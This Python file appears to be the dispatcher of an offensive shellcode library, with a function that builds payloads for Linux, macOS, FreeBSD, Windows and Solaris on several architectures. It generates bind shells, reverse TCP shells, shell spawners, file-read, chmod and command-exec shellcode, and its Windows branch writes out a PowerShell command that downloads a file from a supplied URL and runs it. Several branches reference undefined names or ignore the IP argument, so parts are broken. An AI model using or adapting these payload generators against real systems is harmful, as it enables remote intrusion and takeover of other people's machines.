#------------------Bombermans Team------------------------------------------# 
# Author  : B3mB4m
# Concat  : b3mb4m@protonmail.com
# Project : https://github.com/b3mb4m/shellsploit-library
# LICENSE : https://github.com/b3mb4m/shellsploit-library/blob/master/LICENSE
#----------------------------------------------------------------------------#


def generator(choose=None, shellcode=None, COMMAND=None, FILE=None, ip=None, port=None, URL=None, PASSWORD=None, MESSAGE=None, FILENAME=None):
    if choose == "linux86":
        if shellcode == "binsh_spawn":
            from .Linux86.bin_shx86 import Payload
            return Payload().getpayload()

        elif shellcode == "exec":
            from .Linux86.execc import Payload
            return Payload(execommand=COMMAND).getpayload()

        elif shellcode == "read":
            from .Linux86.readfilex86 import Payload
            from .stackconvert import stackconvertSTR
            return Payload(file=stackconvertSTR(FILE)).getpayload()

        elif shellcode == "download&exec":
            from .Linux86.download import Payload
            from .stackconvert import stackconvertSTR
            filename = URL.split("/")[-1]
            return Payload(url=stackconvertSTR(URL), filename=stackconvertSTR(filename)).getpayload()

        elif shellcode == "chmod":
            from .Linux86.chmod import Payload
            from .stackconvert import stackconvertSTR
            return Payload(file=filestackconvertSTR(FILE)).getpayload()

        elif shellcode == "tcp_bind":
            from .Linux86.tcp_bindx86 import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

        elif shellcode == "reverse_tcp":
            from .Linux86.reverse_tcpx86 import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()

    elif choose == "linux64":
        if shellcode == "binsh_spawn":
            from .Linux64.bin_shx64 import Payload
            return Payload().getpayload()

        elif shellcode == "tcp_bind":
            from .Linux64.tcp_bindx64 import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

        elif shellcode == "reverse_tcp":
            from .Linux64.reverse_tcpx64 import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()

        elif shellcode == "read":
            from .Linux64.readfilex64 import Payload
            from .stackconvert import plaintext
            return Payload(file=plaintext(FILE)).getpayload()

    elif choose == "linux":
        from .Linux.magic import merlin

        if shellcode == "binsh_spawn":
            from .Linux86.bin_shx86 import Payload
            x86 = Payload().getpayload()
            value = hex(len(x86.split("\\x")) - 1)[2:]
            value = "\\x{0}".format(value)
            from .Linux64.bin_shx64 import Payload
            return merlin(value) + x86 + Payload().getpayload()

        elif shellcode == "read":
            from .Linux86.readfilex86 import Payload
            from .stackconvert import stackconvertSTR
            from .stackconvert import plaintext
            x86 = Payload(file=plaintext(FILE)).getpayload()
            from .Linux64.readfilex64 import Payload
            value = hex(len(x86.split("\\x")) - 1)[2:]
            value = "\\x{0}".format(value)
            return merlin(value) + x86 + Payload(file=plaintext(FILE)).getpayload()

        elif shellcode == "reverse_tcp":
            from .Linux86.reverse_tcpx86 import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            x86 = Payload(host=IP(ip), lport=PORT(port)).getpayload()
            value = hex(len(x86.split("\\x")) - 1)[2:]
            value = "\\x{0}".format(value)
            from .Linux64.reverse_tcpx64 import Payload
            return merlin(value) + x86 + Payload(host=IP(ip), lport=PORT(port)).getpayload()

        elif shellcode == "tcp_bind":
            from .Linux86.tcp_bindx86 import Payload
            from .stackconvert import PORT
            x86 = Payload(lport=PORT(port)).getpayload()
            from .Linux64.tcp_bindx64 import Payload
            value = hex(len(x86.split("\\x")) - 1)[2:]
            value = "\\x{0}".format(value)
            return merlin(value) + x86 + Payload(lport=PORT(port)).getpayload()

    elif choose == "osx86":
        if shellcode == "tcp_bind":
            from .OSX86.tcp_bind import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

        elif shellcode == "binsh_spawn":
            from .OSX86.bin_sh import Payload
            return Payload().getpayload()

        elif shellcode == "reverse_tcp":
            from .OSX86.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

    elif choose == "osx64":
        if shellcode == "binsh_spawn":
            from .OSX64.bin_sh import Payload
            return Payload().getpayload()

        elif shellcode == "reverse_tcp":
            from .OSX64.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

        elif shellcode == "tcp_bind":
            from .OSX64.tcp_bind import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

    elif choose == "freebsdx86":
        if shellcode == "binsh_spawn":
            from .FreeBSDx86.bin_sh import Payload
            return Payload().getpayload()		

        elif shellcode == "read":
            from .FreeBSDx86.read import Payload
            from .plaintext import plaintext
            return Payload(file=plaintext(FILE)).getpayload()

        elif shellcode == "reverse_tcp":
            from .FreeBSDx86.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

        elif shellcode == "tcp_bind":
            from .FreeBSDx86.tcp_bind import Payload
            if len(str(ip)) == 5:
                PORT = "\\x{0}\\x{1}".format((hex(int(ip))[2:][0:2], hex(int(ip))[2:][2:]))
            else:
                PORT = "\\x{0}\\x{1}".format(("0" + hex(int(ip))[2:][0], hex(int(ip))[2:][1:]))
            return Payload(lport=PORT).getpayload()

        elif shellcode == "exec":
            from .FreeBSDx86.execc import Payload
            from .plaintext import plaintext
            command = '/bin/sh -c {0}'.format(argv)
            return Payload(execommand=plaintext(COMMAND)).getpayload()

    elif choose == "freebsdx64":
        if shellcode == "binsh_spawn":
            from .FreeBSDx64.bin_sh import Payload
            return Payload().getpayload()

        elif shellcode == "exec":
            from .FreeBSDx64.execc import Payload
            return Payload(execommand=plaintext(COMMAND)).getpayload()	

        elif shellcode == "tcp_bind":
            from .stackconvert import plaintext
            from .stackconvert import PORT
            from .FreeBSDx64.tcp_bind import Payload
            return Payload(lport=PORT(port), password=plaintext(PASSWORD)).getpayload()

        elif shellcode == "reverse_tcp":
            from .FreeBSDx64.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()	

    elif choose == "linux_arm":
        if shellcode == "chmod":
            from .LinuxARM.chmod import Payload
            from .stackconvert import plaintext
            return Payload(file=plaintext(FILE)).getpayload()

        elif shellcode == "binsh_spawn":
            from .LinuxARM.bin_sh import Payload
            return Payload().getpayload()

        elif shellcode == "exec":
            from .LinuxARM.execc import Payload
            return Payload(execommand=COMMAND).getpayload()

        elif shellcode == "reverse_tcp":
            from .LinuxARM.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()

    elif choose == "linux_mips":
        if shellcode == "reverse_tcp":
            from .LinuxMIPS.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()

        elif shellcode == "binsh_spawn":
            from .LinuxMIPS.bin_sh import Payload
            return Payload.getpayload()

        elif shellcode == "chmod": 	
            from .LinuxMIPS.chmod import Payload
            from .stackconvert import plaintext
            return Payload(file=plaintext(FILE)).getpayload()

        elif shellcode == "tcp_bind":
            from .LinuxMIPS.tcp_bind import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()

    elif choose == "windows":
        if shellcode == "messagebox":
            from .Windows.messagebox import Payload
            from .stackconvert import stackconvertSTR
            return Payload(message=stackconvertSTR(MESSAGE, True)).getpayload()

        elif shellcode == "downloandandexecute":
            from .Windows.downloadandexecute import Payload
            from .stackconvert import rawSTR
            from .stackconvert import stackconvertSTR
            if FILENAME == "None":
                FILENAME = URL.split("/")[-1]
            powershell = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s') ;(New-Object -com Shell.Application).ShellExecute('%s');}"''' % (URL, FILENAME, FILENAME)
            return Payload(payload=stackconvertSTR(powershell)).getpayload()

        elif shellcode == "exec":
            from .Windows.execc import WinExec
            return WinExec(COMMAND)

        elif shellcode == "tcp_bind":
            from .Windows.bind_tcp import PayloadModule
            return PayloadModule(port).gen_shellcode()

        elif shellcode == "reverse_tcp":
            from .Windows.rev_tcp import PayloadModule
            return PayloadModule(ip, port).gen_shellcode()

    elif choose == "solarisx86":	
        if shellcode == "read":
            from .Solarisx86.read import Payload
            from .plaintext import plaintext
            return Payload(file=plaintext(FILE)).getpayload()	

        elif shellcode == "reverse_tcp":
            from .Solarisx86.reverse_tcp import Payload
            from .stackconvert import IP
            from .stackconvert import PORT
            return Payload(host=IP(ip), lport=PORT(port)).getpayload()

        elif shellcode == "binsh_spawn":
            from .Solarisx86.bin_sh import bin_sh
            return bin_sh()

        elif shellcode == "tcp_bind":
            from .Solarisx86.tcp_bind import Payload
            from .stackconvert import PORT
            return Payload(lport=PORT(port)).getpayload()
